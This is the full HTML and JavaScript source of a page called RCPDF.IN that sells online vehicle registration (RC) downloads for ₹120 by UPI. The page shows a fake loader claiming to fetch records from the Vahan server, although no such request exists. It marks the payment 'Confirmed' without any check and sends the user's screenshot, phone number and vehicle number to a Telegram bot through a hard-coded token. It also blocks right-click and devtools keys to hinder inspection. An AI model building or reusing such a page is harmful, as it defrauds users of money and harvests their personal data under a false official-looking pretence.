<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Online RC Download</title>
    
    <meta name="description" content="Download Vehicle RC Online at RCPDF.IN. Fast and Secure Service.">
    <meta name="keywords" content="RC Download, Online RTO, Vehicle RC PDF">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    
    <style>
        :root {
            --primary: #00ffcc; /* Cyan Highlight */
            --bg-dark: #0a0a0c;
            --card-bg: rgba(255, 255, 255, 0.05);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent), 
                              radial-gradient(circle at bottom left, #16213e, transparent);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
        }

        /* Top Bar */
        .header {
            width: 100%;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            background: rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .logo { font-weight: 800; font-size: 1.5rem; letter-spacing: 1px; color: var(--primary); }

        /* Main Card */
        .container {
            width: 90%;
            max-width: 420px;
            margin-top: 40px;
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }

        h2 { font-size: 1.2rem; margin-bottom: 20px; text-align: center; color: #eee; }

        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,204,0.2); }

        .btn {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            border: none;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }

        .btn-pay { background: var(--primary); color: #000; box-shadow: 0 10px 20px -5px rgba(0,255,204,0.4); }
        .btn-upi { background: #fff; color: #000; margin-bottom: 20px; }

        /* Modern Loader */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            display: none; flex-direction: column; justify-content: center; align-items: center;
            z-index: 9999;
        }

        .loader-circle {
            width: 120px; height: 120px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .progress-text { font-size: 1.5rem; font-weight: bold; color: var(--primary); }

        /* Refund Text */
        .refund-note {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.2);
            padding: 12px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 0.85rem;
            color: #ffbbbb;
            text-align: center;
        }

        .footer { margin-top: 40px; font-size: 0.8rem; opacity: 0.5; padding-bottom: 20px; }

        #qr-wrap { background: #fff; padding: 15px; border-radius: 15px; margin: 0 auto 20px; width: 200px; }
        #qr-wrap img { width: 100%; display: block; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="header">
        <div class="logo">RCPDF.IN</div>
    </div>

    <div class="container">
        <div id="step1">
            <h2>Vehicle Registration</h2>
            <input type="text" id="veh_num" placeholder="BR 01 AB 1234" oninput="this.value=this.value.toUpperCase()">
            <button class="btn btn-pay" onclick="toStep2()">Next Process</button>
        </div>

        <div id="step2" style="display:none;">
            <button class="btn btn-upi" onclick="openUPI()">Pay ₹120 (UPI App)</button>
            <div id="qr-wrap">
                <img id="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR">
            </div>
            <input type="tel" id="user_mob" placeholder="WhatsApp Number" maxlength="10">
            <p style="font-size: 0.8rem; margin-bottom: 5px;">Upload Screenshot:</p>
            <input type="file" id="ss_img" accept="image/*">
            <button class="btn btn-pay" onclick="processOrder()">Verify & Download</button>

            <div class="refund-note">
                ⚠️ <b>ध्यान दें:</b> एक बार भुगतान सफल होने के बाद, किसी भी स्थिति में <b>Refund (पैसे वापस)</b> नहीं किया जाएगा।
            </div>
        </div>
    </div>

    <div class="footer">© 2026 Apex Solution | Secure Digital Portal</div>

    <div class="loader-overlay" id="loading">
        <div class="loader-circle"></div>
        <div class="progress-text" id="prog_val">0%</div>
        <p style="margin-top: 10px; letter-spacing: 1px; color: #888;">Fetching RC Details from Vahan Server...</p>
    </div>

    <script>
        // Security: F12 Disable
        document.onkeydown = function(e) {
            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false;
        };

        const B_TOK = "8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
        const C_ID = "5600045707";

        function toStep2() {
            if(document.getElementById('veh_num').value.length < 6) {
                alert("Please enter valid Vehicle Number"); return;
            }
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }

        function openUPI() {
            window.location.href = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR";
        }

        async function processOrder() {
            const mob = document.getElementById('user_mob').value;
            const veh = document.getElementById('veh_num').value;
            const file = document.getElementById('ss_img').files[0];

            if(mob.length < 10 || !file) { alert("Mobile number and Screenshot required!"); return; }

            // Show Animated Loader
            const loader = document.getElementById('loading');
            const prog = document.getElementById('prog_val');
            loader.style.display = 'flex';

            let count = 0;
            let interval = setInterval(async () => {
                count += Math.floor(Math.random() * 7) + 2;
                if(count >= 100) {
                    count = 100;
                    clearInterval(interval);
                    
                    // 1. PDF Generation
                    const { jsPDF } = window.jspdf;
                    const doc = new jsPDF();
                    doc.setFontSize(22); doc.text("RCPDF.IN SERVICE", 105, 30, null, null, "center");
                    doc.setFontSize(14); doc.text("ORDER SUMMARY", 20, 50);
                    doc.text("-------------------------", 20, 55);
                    doc.text(`Vehicle No: ${veh}`, 20, 70);
                    doc.text(`WhatsApp No: ${mob}`, 20, 80);
                    doc.text(`Payment: ₹120 (Confirmed)`, 20, 90);
                    doc.text(`Order Date: ${new Date().toLocaleString()}`, 20, 100);
                    doc.save(`RC_Receipt_${veh}.pdf`);

                    // 2. Telegram Send
                    let formData = new FormData();
                    formData.append("chat_id", C_ID);
                    formData.append("photo", file);
                    formData.append("caption", `🚨 NEW ORDER\n\n🚗 Vehicle: ${veh}\n📱 Mobile: ${mob}\n💰 Amt: ₹120\n\nNote: Refund Not Allowed.`);
                    
                    fetch(`https://api.telegram.org/bot${B_TOK}/sendPhoto`, { method: "POST", body: formData });

                    // Final Success Message
                    setTimeout(() => {
                        loader.style.display = 'none';
                        alert("Success! Your Receipt is downloaded. Final RC PDF will be sent on WhatsApp.");
                        location.reload();
                    }, 500);
                }
                prog.innerText = count + "%";
            }, 80);
        }
    </script>
</body>
</html>
